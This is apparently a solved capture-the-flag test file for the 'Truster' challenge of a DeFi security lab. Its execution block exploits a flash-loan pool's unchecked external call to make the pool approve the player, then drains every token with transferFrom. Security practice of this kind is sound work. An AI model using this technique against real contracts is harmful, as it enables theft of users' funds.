const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        // Make the lender call the approve function on the token
        approveSig = ethers.utils.id('approve(address,uint256)').substring(0, 10);
        args = ethers.utils.defaultAbiCoder.encode(["address", "uint256"], [player.address, TOKENS_IN_POOL]).substring(2);

        playerLender = await pool.connect(player);
        await playerLender.flashLoan(0, player.address, token.address, approveSig + args);

        playerToken = await token.connect(player);
        console.log(await playerToken.allowance(pool.address, player.address));
        await playerToken.transferFrom(pool.address, player.address, TOKENS_IN_POOL);

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

